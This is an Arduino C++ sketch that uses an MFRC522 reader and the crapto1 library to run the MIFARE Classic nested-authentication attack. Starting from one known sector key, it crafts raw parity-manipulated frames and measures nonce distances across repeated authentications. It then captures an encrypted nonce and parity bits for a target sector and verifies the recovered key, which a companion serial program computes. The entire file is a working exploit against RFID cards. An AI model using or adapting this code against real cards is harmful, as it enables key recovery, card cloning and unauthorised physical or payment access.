#include <Arduino.h>
#include <SPI.h>
#include <MFRC522.h>
#include <crapto1.h>


#define RST_PIN         9  
#define SS_PIN          10    

#define PARITY_ON 0x00
#define PARITY_OFF 0x10

/*This should be the sector (block/4) you know a key for already. */
#define KNOWN_BLOCK 0

/* This is the sector that you are wanting to attack.*/
#define ATTACK_BLOCK 63 

MFRC522 mfrc522(SS_PIN, RST_PIN);   // Create MFRC522 instance.

void setup() {
    Serial.begin(115200);         // Initialize serial communications with the PC
    while (!Serial);            // Do nothing if no serial port is opened (added for Arduinos based on ATMEGA32U4)
    SPI.begin();                // Init SPI bus
    mfrc522.PCD_Init();         // Init MFRC522 card

}

/*
A helper function that turns an array of bytes/uint8_t's into a uint64_t
*/

uint64_t bytesToInt( byte *intBuffer, byte nrOfBytes )
{
    uint64_t nr = 0;

    for( int i = 0; i<nrOfBytes; i++ )
    {
	nr = ( (nr<<8) | intBuffer[i] );
    }

    return nr;
} 
// end bytesToInt


/*
Generate parity-bits required for raw-frame transport
*/

byte oddparity(const byte bt)
{
  return (0x9669 >> ((bt ^(bt >> 4)) & 0xF)) & 1;
} 
// end oddparity


/*
Helper function that will pack the raw frame if you provide data, length, paritybits, and a buffer for the resultant frame.
*/

byte makeRawFrame( byte *data, byte dataLen, byte *parityBits, byte *packet )
{

    // data sent to FIFO LSB first
    packet[0] = data[0];
    packet[1] = ( parityBits[0] | (data[1]<<1) );
    int i;
    for( i = 2; i< dataLen; i++ )
    {
	packet[i] = ( (parityBits[i-1]<<(i-1) ) | (data[i-1]>>(9-i) ) );
	packet[i] |= (data[i]<<i);
    }
    packet[dataLen] = ( (parityBits[dataLen-1]<<(i-1)) | (data[dataLen-1]>>(9-i) ) );

    return dataLen%8;
}
//end makeRawFrame


/*
Helper function that unpacks an incoming frame into a byte buffer. 
*/
void extractData( byte *packet, byte len, byte *parityBits, byte *data )
{
    data[0] = packet[0];
    
    int i;
    for( i = 1; i<len-1; i++)
    {
	parityBits[i-1] = ( packet[i] & (1<<(i-1)) )>>(i-1);
	data[i] = (packet[i]>>i) | (packet[i+1]<<(8-i));
    }
    parityBits[i-1] = (packet[i] & (1<<(i-1)) )>>(i-1);

}

/* global vars */
struct Crypto1State *keystream;
uint32_t cardPrngState = 0;
uint32_t Nt_as_captured = 0;
int ack;


/*
Full reset of reader and card and our states.
*/
void reset(){

    cardPrngState = 0;
    if (keystream) {
        free(keystream);
        keystream = nullptr;
    }
    mfrc522.PCD_WriteRegister(MFRC522::MfRxReg, PARITY_ON);
    mfrc522.PCD_StopCrypto1();
    mfrc522.PICC_HaltA();

    if ( ! mfrc522.PICC_IsNewCardPresent())
        return;

    if ( ! mfrc522.PICC_ReadCardSerial())
        return;
}


/*
Simple serial read blocker
*/
bool waitreply(){
    while (Serial.available() == 0){
            //wait for reply
        }
        ack = Serial.read();
        if (ack != 0x01) {
            Serial.println("wrong ack!");
            return false;
        }
        else{return true;}
}



/*
Regular authentication request.
*/
bool regularAuth(int block, MFRC522::PICC_Command command, uint32_t uid, byte key[6]) {
    MFRC522::StatusCode status;
    byte packet[9];
    byte parity_bits[8];
    byte data[8];
    byte backData[9];
    byte backLen = 5; 

    //turn off parity
    mfrc522.PCD_WriteRegister(MFRC522::MfRxReg, PARITY_OFF);

    data[0] = command;
    data[1] = block;
    mfrc522.PCD_CalculateCRC(data, 2, &data[2]);
    for (int i = 0 ; i < 4 ; i++){
        parity_bits[i] = oddparity(data[i]);
    }

    byte validBits = makeRawFrame(data, 4, parity_bits, packet);

    status = mfrc522.PCD_TransceiveData(packet, 5, backData, &backLen, &validBits, 0, false);

    if (status > 0){
        Serial.println("myAuth PCD_Transceive 1 failed");
        Serial.println(status);
        return false;
    }
    extractData(backData, 5, parity_bits, data);
    
    cardPrngState = bytesToInt(data, 4);
    Nt_as_captured = bytesToInt(data, 4);

    byte Nr[4] = {0x00};

    uint64_t sectorKey = bytesToInt( key, 6);

    keystream = crypto1_create(sectorKey);

    crypto1_word(keystream, cardPrngState ^ uid, 0); //mix in Nt and UID.


    for (int i = 0 ; i < 4 ; i++){ 
        data[i] = crypto1_byte(keystream, Nr[i], 0) ^ Nr[i]; //encrypt Nr; ciphertext = keystream XOR plaintext;
        parity_bits[i] = filter(keystream->odd) ^ oddparity(Nr[i]);
    }

    cardPrngState = prng_successor(cardPrngState, 32);


    for (int i = 4; i < 8; i++){
        cardPrngState = prng_successor(cardPrngState, 8); 
        data[i] = crypto1_byte(keystream, 0x00, 0) ^ (cardPrngState & 0xFF); //encrypt Ar
        parity_bits[i] = filter(keystream->odd) ^ oddparity(cardPrngState & 0xFF);

    }
    backLen = 5;
    validBits = makeRawFrame(data, 8, parity_bits, packet);
    
    status = mfrc522.PCD_TransceiveData(packet, 9, backData, &backLen, &validBits, 0, false);

    if (status > 0){
        Serial.println("myAuth PCD_Transceive 2 failed");
        Serial.println(status);
        return false;
    }

    extractData( backData, 5, parity_bits, data);

    uint32_t At_enc = bytesToInt(data, 4);

    uint32_t ks1 = crypto1_word(keystream,0x00,0);

    cardPrngState = prng_successor(cardPrngState, 32);
    uint32_t At_decrypted = At_enc ^ ks1;
    uint32_t At_expected = prng_successor(Nt_as_captured, 96);
    if(At_decrypted != At_expected){
        // Serial.println("At_decrypted differs from At_expected");
        mfrc522.PCD_WriteRegister(MFRC522::MfRxReg, PARITY_ON);
        return false;
    }
    return true;

} // end regularAuth




/*
Function used to calculate average nonce distance. Between two auth-requests there is a calculable change between the nonces dependant on the time between the two-auth requests. This function takes the median over 15 requests. It is important to get this right, or you will never generate the key later on.
*/


bool nonce_distance_Auths(int block, MFRC522::PICC_Command command, uint32_t uid, byte key[6]) {
    
    uint32_t newNonce;
    uint32_t encNonce;
    uint32_t At;

    for (int i = 0 ; i < 15 ; i++){

        reset();
        mfrc522.PCD_WriteRegister(MFRC522::MfRxReg, PARITY_OFF);

        if( !(regularAuth(block, command, uid, key))){
            Serial.println("nonce_distance_auth regular auth failed");
            //turn on parity
            mfrc522.PCD_WriteRegister(MFRC522::MfRxReg, PARITY_ON);
            return false;
        };

        MFRC522::StatusCode status;
        byte packet[9];
        byte parity_bits[8];
        byte data[8];
        byte backData[9];
        byte backLen = 5;


        data[0] = command;
        data[1] = block;
        mfrc522.PCD_CalculateCRC(data, 2, &data[2]);
        for (int i = 0 ; i < 4 ; i++){
            byte plain = data[i];
            data[i] = crypto1_byte(keystream, 0x00, 0) ^ plain;
            parity_bits[i] = filter(keystream->odd) ^ oddparity(plain);
        }

        byte validBits = makeRawFrame(data, 4, parity_bits, packet);
    
        status = mfrc522.PCD_TransceiveData(packet, 5, backData, &backLen, &validBits, 0, false); 

        if (status > 0){
            Serial.println("secondAuth PCD_Transceive 1 failed");
            Serial.println(status);
            //turn on parity
            mfrc522.PCD_WriteRegister(MFRC522::MfRxReg, PARITY_ON);
            return false;
        }
        extractData(backData, 5, parity_bits, data);
        encNonce = bytesToInt(data,4);

        //reset keystream
        if (keystream){
            free(keystream);
            keystream = nullptr;
        }
        uint64_t sectorKey = bytesToInt(key, 6);
        keystream = crypto1_create(sectorKey);

        newNonce = encNonce ^ crypto1_word(keystream, encNonce ^ uid, 1); //decrypt nonce.

        /*
        ------------------------------------------------------------------------------------------------------------------------------
        C++ SECTION
        */
        Serial.print("NONCE");Serial.print(i, HEX);Serial.println(newNonce);
        if (!waitreply()){printf("error nonce");return false;}
        Serial.print("STATE");Serial.println(cardPrngState);
        if (!waitreply()){printf("error state");return false;}
        Serial.println("DISTANCE");
        if (!waitreply()){printf("error distance");return false;}
         /*
        ------------------------------------------------------------------------------------------------------------------------------
        C++ SECTION
        */

        byte Nr[4] = {0};

        //encrypt Nr
        for (int i = 0 ; i < 4 ; i++){ 
            data[i] = crypto1_byte(keystream, Nr[i], 0) ^ Nr[i];
            parity_bits[i] = filter(keystream->odd) ^ oddparity(Nr[i]);
        }

        cardPrngState = prng_successor(newNonce, 32); // update current nonce

        //Encrypt Ar.
        for (int i = 4 ; i < 8 ; i++){
            cardPrngState = prng_successor(cardPrngState, 8);
            data[i] = crypto1_byte(keystream,0x00,0) ^ (cardPrngState & 0xFF);
            parity_bits[i] = filter(keystream->odd) ^ oddparity(cardPrngState & 0xFF);
        }
        backLen = 5;
        validBits = makeRawFrame(data, 8, parity_bits, packet);

        status = mfrc522.PCD_TransceiveData(packet, 9, backData, &backLen, &validBits, 0, false);

        if (status > 0){
            Serial.println("Nah2");
            Serial.println(status);
             //turn on parity
            mfrc522.PCD_WriteRegister(MFRC522::MfRxReg, PARITY_ON);
            return false;
        }
        extractData (backData, 5, parity_bits, data);

        cardPrngState = prng_successor(cardPrngState, 32);


        At = bytesToInt(data, 4);
        uint32_t ks1 = crypto1_word(keystream,0x00,0);
        uint32_t plainAt = At ^ ks1;

        if ((plainAt) != (cardPrngState) ){
            Serial.println("plainAt does not match prngstate");
            mfrc522.PCD_WriteRegister(MFRC522::MfRxReg, PARITY_ON);
            return false;
        }

    }
    /*
    ------------------------------------------------------------------------------------------------------------------------------
    C++ SECTION
    */
    Serial.println("MEDIAN");
    if (!waitreply()){printf("error median");return false;}
    /*
    ------------------------------------------------------------------------------------------------------------------------------
    C++ SECTION
    */
    //turn on parity
    mfrc522.PCD_WriteRegister(MFRC522::MfRxReg, PARITY_ON);
    return true;

} //end nonce_distance_Auths


/*
This function drives the actual nested-auth request. First it establishes a normal authentication, and then carries out a slightly modified
*/

bool nestedAuth(int knownblock, int attackblock, MFRC522::PICC_Command command, uint32_t uid, byte key[6], uint32_t* encNt, byte nonceParity[3]){
    //turn off parity
    mfrc522.PCD_WriteRegister(MFRC522::MfRxReg, PARITY_OFF);

    //get a fresh auth-state.
    if( !(regularAuth(knownblock, MFRC522::PICC_CMD_MF_AUTH_KEY_A, uid, key))){
        Serial.println("myAuth within thirdAuth failed.");
        return false;
    }


    MFRC522::StatusCode status;
    byte packet[9];
    byte parity_bits[8];
    byte data[8];
    byte backData[9];
    byte backLen = 5;  
    data[0] = command;
    data[1] = attackblock; //important

    //encrypt the authentication request using the parameters of the current session
    mfrc522.PCD_CalculateCRC(data, 2, &data[2]);
    for (int i = 0 ; i < 4 ; i++){
        byte plain = data[i];
        data[i] = crypto1_byte(keystream, 0x00, 0) ^ plain;
        parity_bits[i] = filter(keystream->odd) ^ oddparity(plain);
    }

    byte validBits = makeRawFrame(data, 4, parity_bits, packet);

    status = mfrc522.PCD_TransceiveData(packet, 5, backData, &backLen, &validBits, 0, false); 
    if (status > 0){
        Serial.println("thirdAuth encrypted PCD_Transceive failed");
        Serial.println(status);
        //turn on parity
        mfrc522.PCD_WriteRegister(MFRC522::MfRxReg, PARITY_ON);
        return false;
    }


    extractData(backData, 5, parity_bits, data);
    *encNt = bytesToInt(data,4);
    for (int i = 0 ; i < 3 ; i++){
        nonceParity[i] = (oddparity(data[i]) != parity_bits[i]);
    }
    /*

    byte keyF[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    struct Crypto1State *t = crypto1_create(bytesToInt(keyF, 6));

    ntF = *encNt ^ crypto1_word(t, *encNt ^ uid, 1);
    free(t);
    */


    //turn on parity
    mfrc522.PCD_WriteRegister(MFRC522::MfRxReg, PARITY_ON);
    return true;
}


void loop() {
    
    uint32_t encNt;
    byte nonceParity[3];
    cardPrngState = 0;
    uint8_t keybuffer[6] = {0};
    uint32_t uid = bytesToInt(mfrc522.uid.uidByte, 4);
    byte key[6] = {0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5};

    // Reset the loop if no new card present on the sensor/reader. This saves the entire process when idle.
    if ( ! mfrc522.PICC_IsNewCardPresent())
        return;

    // Select one of the cards
    if ( ! mfrc522.PICC_ReadCardSerial())
        return;


    // Check if the supplied parameters even work.
    if( !(regularAuth(KNOWN_BLOCK, MFRC522::PICC_CMD_MF_AUTH_KEY_A, uid, key))){
        Serial.println("no");
        goto cleanup;
    };

    //Get nonce-distance
    if (!(nonce_distance_Auths(KNOWN_BLOCK, MFRC522::PICC_CMD_MF_AUTH_KEY_A, uid, key))){ 
        Serial.println("no1");
        goto cleanup;
    }

    reset();

    //prepare for nested-auth
    encNt = 0;
    nonceParity[3] = {0};

    if( !(nestedAuth(KNOWN_BLOCK, ATTACK_BLOCK, MFRC522::PICC_CMD_MF_AUTH_KEY_A, uid, key, &encNt, nonceParity))){
        Serial.println("no3");
        goto cleanup;
    }


    //send over vars of interest
    Serial.print("StateNt");Serial.println(cardPrngState);
    if (!waitreply()){goto cleanup;}
    Serial.print("Nt");Serial.println(Nt_as_captured);
    if (!waitreply()){goto cleanup;}
    Serial.print("encNt");Serial.println(encNt);
    if (!waitreply()){goto cleanup;}
    Serial.print("nonceParity");for (int i = 0 ; i < 3 ; i ++){Serial.print(nonceParity[i]);};Serial.println();
    if (!waitreply()){goto cleanup;}
    Serial.print("UID");Serial.println(uid);
    if (!waitreply()){goto cleanup;}
    Serial.println("CALC");
    if (!waitreply()){goto cleanup;}


    Serial.println("FIND");
    while (Serial.available() == 0){
            //wait for reply
        }
    
    Serial.readBytes(keybuffer,6);
    reset();
    
    if( !(regularAuth(ATTACK_BLOCK, MFRC522::PICC_CMD_MF_AUTH_KEY_A, uid, keybuffer))){
        // Serial.println("Key not successful\n");
        goto cleanup;
    }
    else {
        Serial.println("Found key!!!\n"); 
        for (int i = 0 ; i < 6 ; i++){
            Serial.print(keybuffer[i], HEX);
            Serial.println();
        }
        exit(0);
    }



    cleanup:
    Serial.println("CLEANUP");
    //turn on parity
    mfrc522.PCD_WriteRegister(MFRC522::MfRxReg, PARITY_ON);
    mfrc522.PCD_StopCrypto1();
    mfrc522.PICC_HaltA();
  
    delay(10);

}